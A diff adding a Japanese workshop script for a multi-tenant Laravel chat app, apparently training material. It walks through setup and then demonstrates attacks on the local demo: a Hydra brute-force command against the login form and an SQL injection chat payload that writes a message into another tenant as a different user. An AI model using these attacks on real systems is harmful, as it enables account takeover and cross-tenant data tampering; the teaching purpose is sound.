@@ -1,23 +1,111 @@
+# 0. 初回の起動
+cd ./php/laravel
+./init.sh
 
+# 1. Portforwardが勝手に設定されるので、公開URLを出す
+# 画面下の、「ポート80」の「転送されたアドレス」のURL
+# 例： https://legendary-broccoli-x5995rgjvj33cpp7g-80.app.github.dev
+# このURLを `php/laravel/api/.env.example` に設定し保存する
+# そして、表示範囲の「Private」を右クリックして「Public」に変更する
 
+# 2. 更新とアプリケーション再起動
+# 再度、ターミナルに戻って ./init.sh を実行する
+./init.sh
 
+# 3. サンプルアプリケーションの表示
+# 先ほどのURLにブラウザでアクセスすると、ログイン画面が表示される
+# Email: user@example.com Password: password でログインすると、
+# チャットの画面が表示されるので適当に文字を打ってみる
+
+# 4. PostgreSQL拡張機能でDBをのぞく
+# 接続定義を入力
+# Hostname: localhost
+# User: saasus
+# Password: password
+# Port: 5432
+# Connection: Standard Connection
+# Database: saasus
+# Display name: localhost
+
+# 5. 最低限のテナントIDを入れる
+# 5-1. DBのユーザーテーブルにテナントIDを追加
+# `php/laravel/api/database/migrations/2014_10_12_000000_create_users_table.php`
+# のコメントアウト部分を外す
+# 5-2. DBのユーザーテーブルのテストデータにテナントIDを追加
+# `php/laravel/api/database/seeders/UserSeeder.php`
+# のコメントアウト部分を外す
+# 5-3. 表示処理、書き込み処理にユーザーに応じたテナントIDを追加
+# `php/laravel/api/app/Http/Controllers/MessageController.php`
+# のコメントアウト部分を外す
+# 5-4. 更新とアプリケーション再起動
+# 再度、ターミナルに戻って ./init.sh を実行する
+# すると、いま変更したDBやアプリケーションが反映される
+
+# 6. いろんなユーザーでログインして書いてみる
+# user@example.com, user2@example.com はテナント１
+# user3@example.com, user4@example.com はテナント２
+# というテストデータになっているため、
+# 各ユーザーで入って、テナント間でちゃんとデータが見れないか確かめる
+
+# 7. ログイン認証を突破する攻撃
+# 　ブルートフォース攻撃（総当たり攻撃）を軽く試します
+
+# 7-1. 攻撃ツール(Hydra)のセットアップ
+# 新しいシェルを作成して、以下のコマンドを実行
+# 「＋」を押すと、新しいシェルが開きます
+
+# === nginx コンテナに入る
+cd ./php/laravel/
 docker compose exec nginx bash
+# === nginx コンテナにHydraをインストール
 apt update
 apt install -y hydra
-apt install -y libssl-dev libssh-dev libidn11-dev libpcre3-dev libgtk2.0-dev libmysqlclient-dev libpq-dev libsvn-dev firebird-dev
-
-
+# === 簡易的な総当たり辞書を作る
 cd /tmp/
 echo "password2" > passwords.txt
 echo "password" >> passwords.txt
 echo "password4" >> passwords.txt
 echo "password3" >> passwords.txt
+echo "SaaSTraining" >> passwords.txt
 echo "user@example.com" > usernames.txt
 echo "user10@example.com" >> usernames.txt
 echo "user20@example.com" >> usernames.txt
 echo "user30@example.com" >> usernames.txt
 echo "user40@example.com" >> usernames.txt
 echo "user3@example.com" >> usernames.txt
+# ===
 
+# 7-2. 攻撃ツール(Hydra)の実行
+# 以下コマンドを実行します
 
 hydra -L usernames.txt -P passwords.txt -f -u -vV localhost http-post-form '/login:email=^USER^&password=^PASS^:F=wrong'
+
+
+# 8. テナント境界をまたいじゃう攻撃
+# 　SQLインジェクションを軽く試します
+
+# 8-1. 
+# user@example.com(テナント１のユーザー)
+# でログインしてください。
+
+# 8-2.
+# メッセージに　
+# 以下を入れてみてください。
+
+hello', now()), ('2', '2', 'hacked message
+
+# 8-3. 
+# いったんログアウトし、
+# user3@example.com(テナント２のユーザー)
+# でログインしてください。
+# ※興味がある方は、DBのテーブルものぞいてみてください
+# 先ほどのメッセージ
+# 「hello‘, now()), (’2‘, ’2‘, ’hacked message」
+# で、
+# user@example.com(テナント１のユーザー)
+# が
+# user2@example.com(テナント１のユーザー)
+# になりすまして、
+# テナント２にメッセージが書けてしまいました・・・
+
+以上。
